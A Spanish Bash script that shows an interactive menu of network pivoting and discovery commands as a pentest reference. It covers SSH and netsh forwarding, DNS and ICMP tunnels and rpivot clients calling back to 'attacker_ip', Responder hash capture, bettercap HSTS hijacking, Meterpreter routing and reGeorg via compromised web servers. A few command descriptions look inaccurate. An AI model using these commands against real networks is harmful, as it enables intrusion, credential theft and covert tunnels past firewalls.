#!/bin/bash

# Colores para la interfaz
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

# Configuración global
JUMP_HOST="192.168.1.100"
TARGET_NETWORK="192.168.2.0/24"
LOCAL_PORT="1080"
REMOTE_PORT="3389"
SOCKS_PORT="1080"

# Función para mostrar el banner
show_banner() {
clear
echo -e "${BLUE}"
echo "===================================================================================="
echo "|                          NETWORK PIVOTING & DISCOVERY                             |"
echo "===================================================================================="
echo ""
echo "Descripción:# Network Pivoting & Discovery"
echo "Guía completa de técnicas de pivoting y descubrimiento de redes"
echo "Autor: Oliver - github: "
echo "Fecha: 2025"
echo "==============================================================================="

echo -e "${NC}"
echo -e "${YELLOW}Jump Host:${NC} $JUMP_HOST"
echo -e "${YELLOW}Target Network:${NC} $TARGET_NETWORK"
echo -e "${YELLOW}SOCKS Port:${NC} $SOCKS_PORT"
echo
}

# Función para pausa y continuar
press_enter() {
echo
echo -e "${YELLOW}Presiona Enter para continuar...${NC}"
read
}

# Función para mostrar comandos
show_command() {
local command=$1
local description=$2

echo -e "${GREEN}Descripción:${NC} $description"
echo -e "${CYAN}Comando:${NC}"
echo -e "${YELLOW}$command${NC}"
echo
}

# Función principal
main_menu() {
while true; do
show_banner
echo -e "${GREEN}Menú Principal - Pivoting & Discovery:${NC}"
echo "1. Técnicas de Pivoting"
echo "2. Herramientas de Discovery"
echo "3. SSH Tunneling"
echo "4. Metasploit Pivoting"
echo "5. Herramientas Avanzadas"
echo "6. Configuración de Entorno"
echo "0. Salir"
echo
read -p "Selecciona una opción [0-6]: " option

case $option in
1) pivoting_menu ;;
2) discovery_menu ;;
3) ssh_tunneling_menu ;;
4) metasploit_pivoting_menu ;;
5) advanced_tools_menu ;;
6) config_menu ;;
0) exit 0 ;;
*) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; sleep 2 ;;
esac
done
}

# ==============================================
# MENÚS ESPECÍFICOS
# ==============================================

# Menú de Técnicas de Pivoting
pivoting_menu() {
while true; do
show_banner
echo -e "${GREEN}Técnicas de Pivoting:${NC}"
echo "1. SSH Tunneling (Básico)"
echo "2. Port Forwarding (Windows)"
echo "3. SOCKS Proxies"
echo "4. VPN Pivoting"
echo "5. DNS Tunneling"
echo "6. ICMP Tunneling"
echo "7. Volver al Menú Principal"
echo
read -p "Selecciona una opción [1-7]: " option

case $option in
1) ssh_basic_info ;;
2) windows_pf_info ;;
3) socks_proxies_info ;;
4) vpn_pivoting_info ;;
5) dns_tunneling_info ;;
6) icmp_tunneling_info ;;
7) break ;;
*) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
esac
done
}

# Menú de Herramientas de Discovery
discovery_menu() {
while true; do
show_banner
echo -e "${GREEN}Herramientas de Discovery:${NC}"
echo "1. Nmap Escaneo Avanzado"
echo "2. Masscan - Escaneo Rápido"
echo "3. Netdiscover - ARP Discovery"
echo "4. Responder - LLMNR/NBT-NS"
echo "5. Bettercap - Análisis Completo"
echo "6. Volver al Menú Principal"
echo
read -p "Selecciona una opción [1-6]: " option

case $option in
1) nmap_advanced_info ;;
2) masscan_info ;;
3) netdiscover_info ;;
4) responder_info ;;
5) bettercap_info ;;
6) break ;;
*) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
esac
done
}

# Menú de SSH Tunneling
ssh_tunneling_menu() {
while true; do
show_banner
echo -e "${GREEN}SSH Tunneling Avanzado:${NC}"
echo "1. Local Port Forwarding"
echo "2. Remote Port Forwarding"
echo "3. Dynamic Port Forwarding (SOCKS)"
echo "4. SSH Multiplexing"
echo "5. SSH Config Avanzado"
echo "6. Volver al Menú Principal"
echo
read -p "Selecciona una opción [1-6]: " option

case $option in
1) ssh_local_pf_info ;;
2) ssh_remote_pf_info ;;
3) ssh_dynamic_pf_info ;;
4) ssh_multiplexing_info ;;
5) ssh_config_info ;;
6) break ;;
*) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
esac
done
}

# Menú de Metasploit Pivoting
metasploit_pivoting_menu() {
while true; do
show_banner
echo -e "${GREEN}Metasploit Pivoting:${NC}"
echo "1. Meterpreter Port Forwarding"
echo "2. Autoroute y SOCKS"
echo "3. Pivoting Completo"
echo "4. Reverse Pivoting"
echo "5. Volver al Menú Principal"
echo
read -p "Selecciona una opción [1-5]: " option

case $option in
1) metasploit_pf_info ;;
2) metasploit_socks_info ;;
3) metasploit_full_pivot_info ;;
4) metasploit_reverse_info ;;
5) break ;;
*) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
esac
done
}

# Menú de Herramientas Avanzadas
advanced_tools_menu() {
while true; do
show_banner
echo -e "${GREEN}Herramientas Avanzadas:${NC}"
echo "1. Chisel - TCP/UDP Tunneling"
echo "2. Rpivot - SOCKS Proxy"
echo "3. reGeorg - Web Tunneling"
echo "4. sshuttle - VPN-like Proxy"
echo "5. Plink (Windows SSH)"
echo "6. Proxychains Config"
echo "7. Volver al Menú Principal"
echo
read -p "Selecciona una opción [1-7]: " option

case $option in
1) chisel_info ;;
2) rpivot_info ;;
3) regeorg_info ;;
4) sshuttle_info ;;
5) plink_info ;;
6) proxychains_config_info ;;
7) break ;;
*) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
esac
done
}

# Menú de Configuración
config_menu() {
while true; do
show_banner
echo -e "${GREEN}Configuración de Entorno:${NC}"
echo "1. Configurar Jump Host"
echo "2. Configurar Target Network"
echo "3. Configurar Puerto Local"
echo "4. Configurar Puerto Remoto"
echo "5. Configurar Puerto SOCKS"
echo "6. Volver al Menú Principal"
echo
read -p "Selecciona una opción [1-6]: " option

case $option in
1) read -p "Nuevo Jump Host: " JUMP_HOST; echo -e "${GREEN}Jump Host configurado a: $JUMP_HOST${NC}"; sleep 2 ;;
2) read -p "Nueva Target Network: " TARGET_NETWORK; echo -e "${GREEN}Target Network configurado a: $TARGET_NETWORK${NC}"; sleep 2 ;;
3) read -p "Nuevo Puerto Local: " LOCAL_PORT; echo -e "${GREEN}Puerto Local configurado a: $LOCAL_PORT${NC}"; sleep 2 ;;
4) read -p "Nuevo Puerto Remoto: " REMOTE_PORT; echo -e "${GREEN}Puerto Remoto configurado a: $REMOTE_PORT${NC}"; sleep 2 ;;
5) read -p "Nuevo Puerto SOCKS: " SOCKS_PORT; echo -e "${GREEN}Puerto SOCKS configurado a: $SOCKS_PORT${NC}"; sleep 2 ;;
6) break ;;
*) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; sleep 2 ;;
esac
done
}

# ==============================================
# FUNCIONES DE INFORMACIÓN - PIVOTING
# ==============================================

ssh_basic_info() {
show_banner
echo -e "${GREEN}SSH Tunneling Básico:${NC}"
echo
show_command "ssh -L $LOCAL_PORT:target_host:$REMOTE_PORT user@$JUMP_HOST" "Local Port Forwarding"
show_command "ssh -R $REMOTE_PORT:localhost:$LOCAL_PORT user@$JUMP_HOST" "Remote Port Forwarding"
show_command "ssh -D $SOCKS_PORT user@$JUMP_HOST" "Dynamic Port Forwarding (SOCKS)"
echo -e "${MAGENTA}Objetivo:${NC} Crear túneles seguros a través de hosts intermedios."
echo -e "${MAGENTA}Notas:${NC} Use claves SSH en lugar de contraseñas para mayor seguridad. El forwarding local (-L) redirige puertos del cliente al servidor through el jump host."
press_enter
}

windows_pf_info() {
show_banner
echo -e "${GREEN}Windows Port Forwarding:${NC}"
echo
show_command "netsh interface portproxy add v4tov4 listenport=$LOCAL_PORT listenaddress=0.0.0.0 connectport=$REMOTE_PORT connectaddress=target_host" "Crear port forward"
show_command "netsh interface portproxy show all" "Listar port forwards activos"
show_command "netsh interface portproxy delete v4tov4 listenport=$LOCAL_PORT listenaddress=0.0.0.0" "Eliminar port forward"
show_command "netsh advfirewall firewall add rule name=\"Port Forward $LOCAL_PORT\" dir=in action=allow protocol=TCP localport=$LOCAL_PORT" "Permitir puerto en firewall"
echo -e "${MAGENTA}Objetivo:${NC} Redireccionar puertos en sistemas Windows."
echo -e "${MAGENTA}Notas:${NC} Requiere privilegios administrativos. Verificar que el firewall permite el tráfico."
press_enter
}

socks_proxies_info() {
show_banner
echo -e "${GREEN}SOCKS Proxies:${NC}"
echo
show_command "ssh -D $SOCKS_PORT -f -N user@$JUMP_HOST" "SOCKS Proxy con SSH (background)"
show_command "proxychains nmap -sT -p 80,443,3389 target_host" "Usar proxychains con SOCKS"
show_command "curl --socks5 127.0.0.1:$SOCKS_PORT http://internal_site" "CURL a través de SOCKS"
show_command "proxychains xfreerdp /v:target_host /u:user" "RDP through SOCKS"
echo -e "${MAGENTA}Objetivo:${NC} Enrutar tráfico de aplicaciones a través de proxies SOCKS."
echo -e "${MAGENTA}Notas:${NC} Configure /etc/proxychains.conf para usar el proxy SOCKS. Algunas aplicaciones necesitan soporte nativo de SOCKS."
press_enter
}

vpn_pivoting_info() {
show_banner
echo -e "${GREEN}VPN Pivoting:${NC}"
echo
show_command "openvpn --config client.ovpn" "OpenVPN connection"
show_command "ip route add 192.168.10.0/24 via 10.8.0.1" "Add route through VPN"
show_command "wg-quick up wg0" "WireGuard connection"
show_command "route add -net 192.168.20.0 netmask 255.255.255.0 gw 10.9.0.1" "Add static route"
echo -e "${MAGENTA}Objetivo:${NC} Conectar redes completas through VPN tunnels."
echo -e "${MAGENTA}Notas:${NC} Más estable que SSH tunneling para redes completas. Requiere configuración previa del servidor VPN."
press_enter
}

dns_tunneling_info() {
show_banner
echo -e "${GREEN}DNS Tunneling:${NC}"
echo
show_command "dnscat2-server --dns host=attacker_ip,port=53 --secret=mysecret" "Servidor dnscat2"
show_command "dnscat2 victim.com --secret=mysecret" "Cliente dnscat2"
show_command "iodined -f -c -P password 10.0.0.1 tunnel.domain.com" "Servidor iodine"
show_command "iodine -f -P password tunnel.domain.com" "Cliente iodine"
echo -e "${MAGENTA}Objetivo:${NC} Crear túneles a través de tráfico DNS para evadir firewalls."
echo -e "${MAGENTA}Notas:${NC} Útil cuando solo el puerto 53 (DNS) está abierto. Requiere dominio propio y configuración DNS adecuada."
press_enter
}

icmp_tunneling_info() {
show_banner
echo -e "${GREEN}ICMP Tunneling:${NC}"
echo
show_command "ptunnel -x password" "Servidor ptunnel"
show_command "ptunnel -p attacker_ip -lp 1080 -da target_ip -dp 3389 -x password" "Cliente ptunnel"
show_command "icmpsh -t target_ip -s attacker_ip" "icmpsh (simple)"
show_command "ping -c 4 -p \"68656c6c6f\" target_ip" "Ping con payload"
echo -e "${MAGENTA}Objetivo:${NC} Tunneling a través de paquetes ICMP (ping)."
echo -e "${MAGENTA}Notas:${NC} Funciona incluso en redes muy restrictivas. Bajo ancho de banda. Puede ser detectado por IDS/IPS."
press_enter
}

# ==============================================
# FUNCIONES DE INFORMACIÓN - DISCOVERY
# ==============================================

nmap_advanced_info() {
show_banner
echo -e "${GREEN}Nmap Escaneo Avanzado:${NC}"
echo
show_command "nmap -sS -sV -sC -O -T4 $TARGET_NETWORK" "Escaneo completo con detección de OS"
show_command "nmap -p- --min-rate 10000 $TARGET_NETWORK" "Escaneo rápido de todos los puertos"
show_command "nmap --script vuln,smb-enum-shares $TARGET_NETWORK" "Detección de vulnerabilidades"
show_command "nmap -sU -p 53,67,68,69,123,137,161,162 $TARGET_NETWORK" "Escaneo UDP"
show_command "nmap -sS -p 80,443 --script http-enum $TARGET_NETWORK" "Enumeración HTTP"
echo -e "${MAGENTA}Objetivo:${NC} Descubrir hosts, servicios y vulnerabilidades."
echo -e "${MAGENTA}Notas:${NC} Combine diferentes técnicas para obtener información completa. Use --script-help para ver scripts disponibles."
press_enter
}

masscan_info() {
show_banner
echo -e "${GREEN}Masscan - Escaneo Rápido:${NC}"
echo
show_command "masscan -p1-65535 $TARGET_NETWORK --rate 10000" "Escaneo rápido de puertos"
show_command "masscan -p80,443,3389,22 $TARGET_NETWORK --rate 5000" "Escaneo de puertos comunes"
show_command "masscan -iL targets.txt -p1-65535 --rate 10000" "Escaneo desde lista de archivos"
show_command "masscan --ping $TARGET_NETWORK" "Solo descubrimiento de hosts"
echo -e "${MAGENTA}Objetivo:${NC} Escaneo ultrarrápido de grandes redes."
echo -e "${MAGENTA}Notas:${NC} Masscan puede escanear Internet completo en minutos. Use con precaución para no saturar redes."
press_enter
}

netdiscover_info() {
show_banner
echo -e "${GREEN}Netdiscover - ARP Discovery:${NC}"
echo
show_command "netdiscover -i eth0 -r $TARGET_NETWORK" "Descubrimiento ARP activo"
show_command "netdiscover -p -i eth0" "Modo pasivo (solo escucha)"
show_command "netdiscover -l hosts.txt" "Escaneo desde archivo"
show_command "netdiscover -f" "Modo rápido (menos verificación)"
echo -e "${MAGENTA}Objetivo:${NC} Descubrir hosts en red local mediante ARP."
echo -e "${MAGENTA}Notas:${NC} Muy efectivo en redes LAN. No funciona a través de routers. El modo pasivo es más sigiloso."
press_enter
}

responder_info() {
show_banner
echo -e "${GREEN}Responder - LLMNR/NBT-NS:${NC}"
echo
show_command "responder -I eth0 -wrf" "Modo activo (respuestas)"
show_command "responder -I eth0 -A" "Modo análisis (solo escucha)"
show_command "responder -I eth0 -dw" "Deshabilitar HTTP/SMB"
show_command "cat /usr/share/responder/logs/*.txt" "Ver logs capturados"
echo -e "${MAGENTA}Objetivo:${NC} Capturar hashes NTLMv2 through LLMNR/NBT-NS poisoning."
echo -e "${MAGENTA}Notas:${NC} Muy efectivo en redes Windows. Puede interrumpir servicios legítimos, usar con cuidado."
press_enter
}

bettercap_info() {
show_banner
echo -e "${GREEN}Bettercap - Análisis Completo:${NC}"
echo
show_command "bettercap -iface eth0" "Modo interactivo"
show_command "bettercap -iface eth0 -sniff" "Sniffing de tráfico"
show_command "bettercap -iface eth0 -eval 'net.probe on; net.recon on'" "Descubrimiento automático"
show_command "bettercap -iface eth0 -caplet hstshijack/hstshijack" "HSTS Hijacking"
echo -e "${MAGENTA}Objetivo:${NC} Análisis completo de red y ataques Man-in-the-Middle."
echo -e "${MAGENTA}Notas:${NC} Herramienta muy poderosa. Use responsablemente y solo en redes propias o con autorización."
press_enter
}

# ==============================================
# FUNCIONES DE INFORMACIÓN - SSH TUNNELING
# ==============================================

ssh_local_pf_info() {
show_banner
echo -e "${GREEN}SSH Local Port Forwarding:${NC}"
echo
show_command "ssh -L 3389:internal_host:3389 user@$JUMP_HOST" "Forward RDP"
show_command "ssh -L 445:internal_host:445 user@$JUMP_HOST" "Forward SMB"
show_command "ssh -L 9000-9010:internal_host:9000-9010 user@$JUMP_HOST" "Forward rango de puertos"
echo -e "${MAGENTA}Objetivo:${NC} Redireccionar puertos locales a hosts internos through jump host."
echo -e "${MAGENTA}Notas:${NC} Los puertos se abren en localhost. Use -g para permitir conexiones externas (peligroso)."
press_enter
}

ssh_remote_pf_info() {
show_banner
echo -e "${GREEN}SSH Remote Port Forwarding:${NC}"
echo
show_command "ssh -R 8080:localhost:80 user@$JUMP_HOST" "Exponer web local"
show_command "ssh -R 2222:localhost:22 user@$JUMP_HOST" "Exponer SSH local"
show_command "ssh -R 0.0.0.0:3389:internal_host:3389 user@$JUMP_HOST" "Exponer en todas las interfaces"
echo -e "${MAGENTA}Objetivo:${NC} Exponer servicios locales al jump host."
echo -e "${MAGENTA}Notas:${NC} Útil para bypassear NAT/firewalls. Por defecto solo se expone en localhost del jump host."
press_enter
}

ssh_dynamic_pf_info() {
show_banner
echo -e "${GREEN}SSH Dynamic Port Forwarding:${NC}"
echo
show_command "ssh -D $SOCKS_PORT user@$JUMP_HOST" "SOCKS proxy básico"
show_command "ssh -D $SOCKS_PORT -C user@$JUMP_HOST" "SOCKS con compresión"
show_command "ssh -D $SOCKS_PORT -q -N user@$JUMP_HOST" "SOCKS silencioso en background"
echo -e "${MAGENTA}Objetivo:${NC} Crear proxy SOCKS dinámico through SSH."
echo -e "${MAGENTA}Notas:${NC} Todas las aplicaciones pueden usar este proxy. Configure browser o proxychains."
press_enter
}

ssh_multiplexing_info() {
show_banner
echo -e "${GREEN}SSH Multiplexing:${NC}"
echo
show_command "ssh -M -S /tmp/ssh_mux -f -N user@$JUMP_HOST" "Create master connection"
show_command "ssh -S /tmp/ssh_mux user@$JUMP_HOST" "Reuse connection"
show_command "ssh -O exit -S /tmp/ssh_mux user@$JUMP_HOST" "Close master connection"
echo -e "${MAGENTA}Objetivo:${NC} Reutilizar conexiones SSH para mayor velocidad."
echo -e "${MAGENTA}Notas:${NC} Reduce overhead de múltiples conexiones SSH. Muy útil para scripting."
press_enter
}

ssh_config_info() {
show_banner
echo -e "${GREEN}SSH Config Avanzado:${NC}"
echo
show_command "echo 'Host jump_host\n  HostName 192.168.1.100\n  User user\n  IdentityFile ~/.ssh/id_rsa\n  LocalForward 1080 localhost:1080' >> ~/.ssh/config" "SSH config file"
show_command "ssh -W internal_host:3389 jump_host" "ProxyJump equivalent"
show_command "ssh -J user1@jump1,user2@jump2 internal_host" "Multiple jumps"
echo -e "${MAGENTA}Objetivo:${NC} Configuración avanzada de SSH para pivoting complejo."
echo -e "${MAGENTA}Notas:${NC} El archivo ~/.ssh/config simplifica conexiones complejas."
press_enter
}

# ==============================================
# FUNCIONES DE INFORMACIÓN - METASPLOIT
# ==============================================

metasploit_pf_info() {
show_banner
echo -e "${GREEN}Metasploit Port Forwarding:${NC}"
echo
show_command "portfwd add -l 3389 -p 3389 -r internal_host" "Forward RDP"
show_command "portfwd add -l 445 -p 445 -r internal_host" "Forward SMB"
show_command "portfwd list" "List active forwards"
show_command "portfwd delete -l 3389 -p 3389 -r internal_host" "Delete forward"
echo -e "${MAGENTA}Objetivo:${NC} Port forwarding through Meterpreter session."
echo -e "${MAGENTA}Notas:${NC} Works even through multiple hops. Uses existing Meterpreter session."
press_enter
}

metasploit_socks_info() {
show_banner
echo -e "${GREEN}Metasploit SOCKS Proxy:${NC}"
echo
show_command "use auxiliary/server/socks_proxy" "Start SOCKS server"
show_command "set VERSION 4a" "Set SOCKS version"
show_command "set SRVPORT 1080" "Set port"
show_command "run" "Start proxy"
show_command "use post/multi/manage/autoroute" "Auto add routes"
echo -e "${MAGENTA}Objetivo:${NC} Create SOCKS proxy through Metasploit sessions."
echo -e "${MAGENTA}Notas:${NC} Combine with autoroute for automatic routing through sessions."
press_enter
}

metasploit_full_pivot_info() {
show_banner
echo -e "${GREEN}Metasploit Pivoting Completo:${NC}"
echo
show_command "use post/multi/manage/autoroute" "Auto add routes"
show_command "set SESSION 1" "Set session"
show_command "set SUBNET 192.168.10.0/24" "Set target subnet"
show_command "run" "Add route"
show_command "use auxiliary/server/socks_proxy" "Start SOCKS"
echo -e "${MAGENTA}Objetivo:${NC} Pivoting completo con rutas automáticas y SOCKS."
echo -e "${MAGENTA}Notas:${NC} Combina autoroute y SOCKS proxy para acceso completo a la red interna."
press_enter
}

metasploit_reverse_info() {
show_banner
echo -e "${GREEN}Metasploit Reverse Pivoting:${NC}"
echo
show_command "portfwd add -R -l 8080 -p 80 -L 192.168.1.100" "Reverse forward"
show_command "use exploit/windows/local/portfwder" "Port forwarder payload"
echo -e "${MAGENTA}Objetivo:${NC} Reverse pivoting from internal network to attacker."
echo -e "${MAGENTA}Notas:${NC} Useful when internal host can't connect out. Creates reverse tunnels."
press_enter
}

# ==============================================
# FUNCIONES DE INFORMACIÓN - HERRAMIENTAS AVANZADAS
# ==============================================

chisel_info() {
show_banner
echo -e "${GREEN}Chisel - TCP/UDP Tunneling:${NC}"
echo
show_command "chisel server -p 8080 --reverse" "Servidor Chisel"
show_command "chisel client server_ip:8080 R:1080:socks" "Cliente SOCKS"
show_command "chisel client server_ip:8080 R:3389:target:3389" "Reverse port forward"
show_command "chisel client server_ip:8080 0.0.0.0:445:target:445" "Local port forward"
echo -e "${MAGENTA}Objetivo:${NC} Tunneling TCP/UDP a través de firewalls."
echo -e "${MAGENTA}Notas:${NC} Herramienta poderosa escrita en Go. Soporta reconexión automática y cifrado."
press_enter
}

rpivot_info() {
show_banner
echo -e "${GREEN}Rpivot - SOCKS Proxy:${NC}"
echo
show_command "python server.py --proxy-port 1080 --server-port 9443" "Servidor Rpivot"
show_command "python client.py --server-ip attacker_ip --server-port 9443" "Cliente Rpivot"
show_command "python client.py --server-ip attacker_ip --server-port 9443 --ntlm-proxy-ip proxy_ip --ntlm-proxy-port 8080 --domain CORP --username user" "Through corporate proxy"
echo -e "${MAGENTA}Objetivo:${NC} Crear proxies SOCKS a través de hosts comprometidos."
echo -e "${MAGENTA}Notas:${NC} Soporta autenticación NTLM a través de proxies corporativos. Muy sigiloso."
press_enter
}

regeorg_info() {
show_banner
echo -e "${GREEN}reGeorg - Web Tunneling:${NC}"
echo
show_command "python reGeorgSocksProxy.py -p 1080 -u http://victim/tunnel.php" "Proxy SOCKS through web"
show_command "proxychains nmap -sT -p 3389 internal_ip" "Scan through reGeorg"
echo -e "${MAGENTA}Objetivo:${NC} Crear tunnels SOCKS a través de servidores web comprometidos."
echo -e "${MAGENTA}Notas:${NC} Ideal cuando solo el puerto 80/443 está abierto. Sube tunnel.aspx al servidor web."
press_enter
}

sshuttle_info() {
show_banner
echo -e "${GREEN}sshuttle - VPN-like Proxy:${NC}"
echo
show_command "sshuttle -r user@jump_host 192.168.0.0/24" "VPN completa para red"
show_command "sshuttle -r user@jump_host -x 192.168.1.100 192.168.0.0/24" "Excluir IP específica"
show_command "sshuttle -r user@jump_host --dns 192.168.0.0/24" "Incluir tunneling DNS"
echo -e "${MAGENTA}Objetivo:${NC} Crear VPN-like transparente sobre SSH."
echo -e "${MAGENTA}Notas:${NC} No requiere root en el lado del cliente. Soporta DNS tunneling."
press_enter
}

plink_info() {
show_banner
echo -e "${GREEN}Plink (Windows SSH):${NC}"
echo
show_command "plink.exe -ssh -P 22 -pw password user@jump_host -L 3389:internal_host:3389" "Local port forward"
show_command "plink.exe -ssh -P 22 -pw password user@jump_host -R 8080:localhost:80" "Remote port forward"
show_command "plink.exe -ssh -P 22 -pw password user@jump_host -D 1080" "Dynamic SOCKS"
echo -e "${MAGENTA}Objetivo:${NC} SSH tunneling en Windows sin cliente SSH nativo."
echo -e "${MAGENTA}Notas:${NC} Parte de PuTTY. Útil en entornos Windows restrictivos."
press_enter
}

proxychains_config_info() {
show_banner
echo -e "${GREEN}Proxychains Configuration:${NC}"
echo
show_command "echo 'socks5 127.0.0.1 1080' >> /etc/proxychains.conf" "Add SOCKS proxy"
show_command "proxychains nmap -sT -p 80,443,3389 internal_ip" "Nmap through proxy"
show_command "proxychains xfreerdp /v:internal_ip /u:user" "RDP through proxy"
show_command "proxychains evil-winrm -i internal_ip -u user" "WinRM through proxy"
echo -e "${MAGENTA}Objetivo:${NC} Configurar y usar proxychains para redirigir tráfico."
echo -e "${MAGENTA}Notas:${NC} Editar /etc/proxychains.conf para múltiples proxies en cadena. Use -f para config file personalizado."
press_enter
}

# ==============================================
# INICIO DE LA APLICACIÓN
# ==============================================

echo -e "${GREEN}Iniciando Network Pivoting & Discovery Toolkit...${NC}"
sleep 2
main_menu
